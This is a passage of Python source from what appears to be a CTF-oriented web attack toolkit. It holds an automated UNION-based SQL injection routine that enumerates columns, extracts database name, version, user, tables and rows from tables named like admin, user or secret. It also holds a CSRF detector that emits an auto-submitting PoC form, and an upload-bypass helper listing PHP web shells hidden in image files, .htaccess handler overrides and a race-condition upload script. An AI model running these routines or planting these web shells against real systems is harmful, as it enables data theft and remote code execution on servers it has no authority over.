                # ORDER BY 失败的标志：报错，或响应和 ORDER BY 1 明显不同
                if has_error or abs(len(resp.text) - ob1_len) > 10:
                    column_count = n - 1
                    results.append(f"  [+] ORDER BY {n}: {t('web.sqli_auto.error')} -> columns = {n - 1}")
                    break

        if column_count == 0:
            results.append(f"[-] {t('web.sqli_auto.column_detect_failed')}")
            results.append(f"[*] {t('web.sqli_auto.manual_column_hint')}")
            return "\n".join(results)

        results.append(f"[+] {t('web.sqli_auto.column_count')}: {column_count}")

        # ========================================
        # 步骤 3：确定回显位
        # ========================================
        results.append(f"\n{'='*50}")
        results.append(f"[Step 3] {t('web.sqli_auto.step3_title')}")
        results.append(f"{'='*50}")

        echo_positions = []
        select_items = [str(i) for i in range(1, column_count + 1)]
        neg_prefix = f"-99999{inject_prefix[len(original_value):]}" if inject_type != "numeric" else "-99999"

        union_values = ",".join(select_items)
        payload = f"{neg_prefix} UNION SELECT {union_values} {comment_suffix}"
        resp = _send_payload(payload)

        if resp:
            for i in range(1, column_count + 1):
                marker = str(i)
                if marker in resp.text:
                    # 确认是因为 UNION SELECT 注入的
                    if marker not in baseline_text or resp.text.count(marker) > baseline_text.count(marker):
                        echo_positions.append(i)

        if not echo_positions:
            # 使用字符串标记重试
            select_items_str = []
            for i in range(1, column_count + 1):
                select_items_str.append(f"concat(0x7e7e7e,{i},0x7e7e7e)")
            union_values_str = ",".join(select_items_str)
            payload = f"{neg_prefix} UNION SELECT {union_values_str} {comment_suffix}"
            resp = _send_payload(payload)
            if resp:
                for i in range(1, column_count + 1):
                    if f"~~~{i}~~~" in resp.text:
                        echo_positions.append(i)

        if echo_positions:
            results.append(f"[+] {t('web.sqli_auto.echo_positions')}: {echo_positions}")
        else:
            results.append(f"[-] {t('web.sqli_auto.no_echo')}")
            results.append(f"[*] {t('web.sqli_auto.blind_hint')}")
            # 即使无回显位也继续尝试

        # 选择一个回显位用于后续注入
        echo_pos = echo_positions[0] if echo_positions else 1

        def _build_union_payload(inject_expr):
            """构建 UNION SELECT payload，在 echo_pos 位置注入表达式"""
            items = []
            for i in range(1, column_count + 1):
                if i == echo_pos:
                    items.append(inject_expr)
                else:
                    items.append("NULL")
            # 使用不存在的值（-99999）确保原始查询返回空，只显示 UNION 结果
            neg_prefix = f"-99999{inject_prefix[len(original_value):]}" if inject_type != "numeric" else "-99999"
            return f"{neg_prefix} UNION SELECT {','.join(items)} {comment_suffix}"

        # ========================================
        # 步骤 4：提取数据库信息
        # ========================================
        results.append(f"\n{'='*50}")
        results.append(f"[Step 4] {t('web.sqli_auto.step4_title')}")
        results.append(f"{'='*50}")

        db_info = {}
        info_queries = {
            "database()": "concat(0x7e7e7e,database(),0x7e7e7e)",
            "version()": "concat(0x7e7e7e,version(),0x7e7e7e)",
            "user()": "concat(0x7e7e7e,user(),0x7e7e7e)",
        }

        for label, expr in info_queries.items():
            payload = _build_union_payload(expr)
            resp = _send_payload(payload)
            if resp:
                match = re.search(r'~~~(.+?)~~~', resp.text)
                if match:
                    value = match.group(1)
                    db_info[label] = value
                    results.append(f"  [+] {label} = {value}")
                else:
                    results.append(f"  [-] {label}: {t('web.sqli_auto.extract_failed')}")
            else:
                results.append(f"  [-] {label}: {t('web.request_failed')}")

        current_db = db_info.get("database()", "")

        # ========================================
        # 步骤 5：提取表名
        # ========================================
        results.append(f"\n{'='*50}")
        results.append(f"[Step 5] {t('web.sqli_auto.step5_title')}")
        results.append(f"{'='*50}")

        tables = []
        table_expr = "concat(0x7e7e7e,group_concat(table_name SEPARATOR 0x2c2c),0x7e7e7e)"
        if current_db:
            where_clause = f"table_schema=0x{current_db.encode().hex()}"
        else:
            where_clause = "table_schema=database()"
        inject = f"(SELECT {table_expr} FROM information_schema.tables WHERE {where_clause})"
        payload = _build_union_payload(inject)
        resp = _send_payload(payload)
        if resp:
            match = re.search(r'~~~(.+?)~~~', resp.text)
            if match:
                tables = [t_name.strip() for t_name in match.group(1).split(",,") if t_name.strip()]
                results.append(f"  [+] {t('web.sqli_auto.tables_found')} ({len(tables)}):")
                for tbl in tables:
                    results.append(f"    - {tbl}")
            else:
                results.append(f"  [-] {t('web.sqli_auto.tables_extract_failed')}")

        if not tables:
            results.append(f"  [-] {t('web.sqli_auto.no_tables')}")
            results.append(f"\n{'='*50}")
            results.append(f"=== {t('web.sqli_auto.partial_result')} ===")
            if db_info:
                for k, v in db_info.items():
                    results.append(f"  {k} = {v}")
            results.append(f"\n[*] {t('web.sqli_auto.manual_continue')}")
            results.append(f"  {t('web.sqli_auto.hint_columns')}: {column_count}")
            results.append(f"  {t('web.sqli_auto.hint_echo')}: {echo_positions or t('web.sqli_auto.none')}")
            return "\n".join(results)

        # ========================================
        # 步骤 6：提取敏感表的列名和数据
        # ========================================
        results.append(f"\n{'='*50}")
        results.append(f"[Step 6] {t('web.sqli_auto.step6_title')}")
        results.append(f"{'='*50}")

        sensitive_table_keywords = ["flag", "secret", "admin", "user"]
        target_tables = []
        for tbl in tables:
            tbl_lower = tbl.lower()
            for kw in sensitive_table_keywords:
                if kw in tbl_lower:
                    target_tables.append(tbl)
                    break

        if not target_tables:
            # 如果没有匹配的敏感表，取前 3 个表
            target_tables = tables[:3]
            results.append(f"  [*] {t('web.sqli_auto.no_sensitive_tables')}")
            results.append(f"  [*] {t('web.sqli_auto.using_first_tables')}: {', '.join(target_tables)}")
        else:
            results.append(f"  [+] {t('web.sqli_auto.sensitive_tables')}: {', '.join(target_tables)}")

        for tbl in target_tables:
            results.append(f"\n  --- {t('web.sqli_auto.table')}: {tbl} ---")

            # 提取列名
            col_extract_expr = "concat(0x7e7e7e,group_concat(column_name SEPARATOR 0x2c2c),0x7e7e7e)"
            if current_db:
                col_where = f"table_schema=0x{current_db.encode().hex()} AND table_name=0x{tbl.encode().hex()}"
            else:
                col_where = f"table_schema=database() AND table_name=0x{tbl.encode().hex()}"
            inject = f"(SELECT {col_extract_expr} FROM information_schema.columns WHERE {col_where})"
            payload = _build_union_payload(inject)
            resp = _send_payload(payload)

            columns = []
            if resp:
                match = re.search(r'~~~(.+?)~~~', resp.text)
                if match:
                    columns = [c.strip() for c in match.group(1).split(",,") if c.strip()]
                    results.append(f"  {t('web.sqli_auto.columns')}: {', '.join(columns)}")

            if not columns:
                results.append(f"  [-] {t('web.sqli_auto.columns_extract_failed')}")
                continue

            # 提取前 10 行数据
            col_concat = ",0x7c7c,".join([f"IFNULL({c},0x4e554c4c)" for c in columns])
            data_expr = f"concat(0x7e7e7e,group_concat({col_concat} SEPARATOR 0x3b3b),0x7e7e7e)"
            inject = f"(SELECT {data_expr} FROM (SELECT * FROM `{tbl}` LIMIT 10) AS sub)"
            payload = _build_union_payload(inject)
            resp = _send_payload(payload)

            data_extracted = False
            if resp:
                match = re.search(r'~~~(.+?)~~~', resp.text)
                if match:
                    raw_data = match.group(1)
                    rows = raw_data.split(";;")
                    results.append(f"  {t('web.sqli_auto.data_rows')} ({min(len(rows), 10)}):")
                    # 表头
                    results.append(f"    | {' | '.join(columns)} |")
                    results.append(f"    |{'|'.join(['-' * (len(c) + 2) for c in columns])}|")
                    for row in rows[:10]:
                        cells = row.split("||")
                        results.append(f"    | {' | '.join(cells)} |")
                    data_extracted = True

                    # 高亮可能的 flag
                    flag_pattern = r'(?:flag|ctf|CTF)\{[^}]+\}'
                    flags = re.findall(flag_pattern, raw_data)
                    if flags:
                        results.append(f"\n  [!!!] {t('web.sqli_auto.flag_found')}:")
                        for flag in flags:
                            results.append(f"    >> {flag}")

            if not data_extracted:
                # 尝试不使用子查询
                col_concat2 = ",0x7c7c,".join([f"IFNULL(`{c}`,0x4e554c4c)" for c in columns])
                data_expr2 = f"concat(0x7e7e7e,group_concat({col_concat2} SEPARATOR 0x3b3b),0x7e7e7e)"
                inject2 = f"(SELECT {data_expr2} FROM `{tbl}` LIMIT 10)"
                payload2 = _build_union_payload(inject2)
                resp2 = _send_payload(payload2)
                if resp2:
                    match2 = re.search(r'~~~(.+?)~~~', resp2.text)
                    if match2:
                        raw_data = match2.group(1)
                        rows = raw_data.split(";;")
                        results.append(f"  {t('web.sqli_auto.data_rows')} ({min(len(rows), 10)}):")
                        results.append(f"    | {' | '.join(columns)} |")
                        results.append(f"    |{'|'.join(['-' * (len(c) + 2) for c in columns])}|")
                        for row in rows[:10]:
                            cells = row.split("||")
                            results.append(f"    | {' | '.join(cells)} |")
                        data_extracted = True

                        flag_pattern = r'(?:flag|ctf|CTF)\{[^}]+\}'
                        flags = re.findall(flag_pattern, raw_data)
                        if flags:
                            results.append(f"\n  [!!!] {t('web.sqli_auto.flag_found')}:")
                            for flag in flags:
                                results.append(f"    >> {flag}")

                if not data_extracted:
                    results.append(f"  [-] {t('web.sqli_auto.data_extract_failed')}")

        # 总结
        results.append(f"\n{'='*50}")
        results.append(f"=== {t('web.summary')} ===")
        results.append(f"  {t('web.sqli_auto.param_name')}: {param}")
        results.append(f"  {t('web.sqli_auto.hint_columns')}: {column_count}")
        results.append(f"  {t('web.sqli_auto.hint_echo')}: {echo_positions or t('web.sqli_auto.none')}")
        if db_info:
            for k, v in db_info.items():
                results.append(f"  {k} = {v}")
        if tables:
            results.append(f"  {t('web.sqli_auto.tables_count')}: {len(tables)}")
        results.append(f"\n[*] {t('web.sqli_auto.manual_continue')}")
        results.append(f"  1. {t('web.sqli_auto.tip_tamper')}")
        results.append(f"  2. {t('web.sqli_auto.tip_time_blind')}")
        results.append(f"  3. {t('web.sqli_auto.tip_sqlmap')}")

        return "\n".join(results)

    # ==================== CSRF Detection ====================

    def detect_csrf(self, url: str) -> str:
        """CSRF 跨站请求伪造检测"""
        self._check_requests()
        results = [f"=== CSRF {t('web.detection')} ===", f"{t('web.target')}: {url}", ""]
        found = False

        try:
            resp = self._get(url)
        except Exception as e:
            return f"[-] {t('web.connect_fail')}: {e}"

        # 1. 检查 HTML 表单中是否缺少 CSRF Token
        html = resp.text.lower()
        forms = re.findall(r'<form[^>]*>.*?</form>', html, re.DOTALL)
        csrf_keywords = ['csrf', '_token', 'authenticity_token', 'csrfmiddlewaretoken',
                         '__requestverificationtoken', 'antiforgery', '_csrf_token']

        if forms:
            results.append(f"[*] {t('web.csrf.forms_found')}: {len(forms)}")
            for i, form in enumerate(forms, 1):
                has_token = any(kw in form for kw in csrf_keywords)
                if not has_token and ('method' not in form or 'post' in form):
                    results.append(f"  [!] Form #{i}: {t('web.csrf.no_token')}")
                    found = True
                else:
                    results.append(f"  [+] Form #{i}: {t('web.csrf.has_token')}")
        else:
            results.append(f"[-] {t('web.csrf.no_forms')}")

        # 2. 检查 Cookie SameSite 属性
        results.append(f"\n=== Cookie SameSite {t('web.csrf.check')} ===")
        cookies = resp.headers.get('Set-Cookie', '')
        if cookies:
            if 'samesite' not in cookies.lower():
                results.append(f"  [!] {t('web.csrf.no_samesite')}")
                found = True
            else:
                samesite = re.search(r'samesite=(\w+)', cookies, re.IGNORECASE)
                if samesite:
                    val = samesite.group(1).lower()
                    if val == 'none':
                        results.append(f"  [!] SameSite=None — {t('web.csrf.samesite_none')}")
                        found = True
                    else:
                        results.append(f"  [+] SameSite={samesite.group(1)}")
        else:
            results.append(f"  [-] {t('web.csrf.no_cookies')}")

        # 3. 检查安全头
        results.append(f"\n=== {t('web.csrf.header_check')} ===")
        headers = {k.lower(): v for k, v in resp.headers.items()}
        if 'x-frame-options' not in headers:
            results.append(f"  [!] {t('web.csrf.no_xfo')}")
        else:
            results.append(f"  [+] X-Frame-Options: {headers['x-frame-options']}")

        # 4. 生成 CSRF PoC
        if found:
            results.append("\n=== CSRF PoC HTML ===")
            poc = (
                '<html>\n<body>\n'
                f'  <h1>CSRF PoC</h1>\n'
                f'  <form action="{url}" method="POST">\n'
                '    <input type="hidden" name="param" value="evil" />\n'
                '    <input type="submit" value="Submit" />\n'
                '  </form>\n'
                '  <script>document.forms[0].submit();</script>\n'
                '</body>\n</html>'
            )
            results.append(poc)
        else:
            results.append(f"\n[+] {t('web.csrf.not_found')}")

        return "\n".join(results)

    # ==================== File Upload Helper ====================

    def file_upload_helper(self, url: str = "") -> str:
        """文件上传漏洞绕过辅助"""
        lines = [f"=== {t('web.upload.title')} ===", ""]

        # 1. Content-Type 绕过
        lines.append(f"[1] Content-Type {t('web.upload.bypass')}:")
        ct_payloads = [
            ("image/jpeg", t("web.upload.ct_jpeg")),
            ("image/png", t("web.upload.ct_png")),
            ("image/gif", t("web.upload.ct_gif")),
            ("application/octet-stream", t("web.upload.ct_octet")),
        ]
        for ct, desc in ct_payloads:
            lines.append(f"  Content-Type: {ct}  — {desc}")

        # 2. 扩展名绕过
        lines.append(f"\n[2] {t('web.upload.ext_bypass')}:")
        ext_payloads = [
            "shell.php.jpg", "shell.php.png", "shell.php5", "shell.phtml",
            "shell.pHp", "shell.PHP", "shell.php3", "shell.php7",
            "shell.php%00.jpg", "shell.php\\x00.jpg",
            "shell.jpg.php", "shell.php.",  "shell.php::$DATA",
            "shell.php;.jpg", "shell.php%0a.jpg",
        ]
        for p in ext_payloads:
            lines.append(f"  {p}")

        # 3. .htaccess 利用
        lines.append(f"\n[3] .htaccess {t('web.upload.htaccess')}:")
        lines.append('  AddType application/x-httpd-php .jpg')
        lines.append('  AddType application/x-httpd-php .png')
        lines.append('  SetHandler application/x-httpd-php')

        # 4. 图片马
        lines.append(f"\n[4] {t('web.upload.image_shell')}:")
        lines.append("  # GIF + PHP:")
        lines.append("  GIF89a<?php @eval($_POST['cmd']);?>")
        lines.append("")
        lines.append("  # PNG + PHP (exiftool):")
        lines.append("  exiftool -Comment='<?php system($_GET[\"cmd\"]); ?>' image.png")
        lines.append("")
        lines.append("  # JPEG + PHP:")
        lines.append("  exiftool -Comment='<?php eval($_POST[\"a\"]); ?>' image.jpg")

        # 5. 二次渲染绕过
        lines.append(f"\n[5] {t('web.upload.re_render')}:")
        lines.append(f"  - {t('web.upload.re_render_tip1')}")
        lines.append(f"  - {t('web.upload.re_render_tip2')}")
        lines.append(f"  - {t('web.upload.re_render_tip3')}")

        # 6. 分块上传 / 竞争条件
        lines.append(f"\n[6] {t('web.upload.race')}:")
        lines.append("  import threading, requests")
        lines.append("  def upload(): requests.post(url, files={'file': open('shell.php','rb')})")
        lines.append("  def access(): requests.get(url + '/uploads/shell.php')")
        lines.append("  for _ in range(100):")
        lines.append("      threading.Thread(target=upload).start()")
        lines.append("      threading.Thread(target=access).start()")

        # 7. 常见上传路径
        lines.append(f"\n[7] {t('web.upload.common_paths')}:")
        paths = ['/upload/', '/uploads/', '/files/', '/images/', '/media/',
                 '/static/uploads/', '/wp-content/uploads/', '/tmp/', '/var/tmp/']
        for p in paths:
            lines.append(f"  {p}")

        return "\n".join(lines)
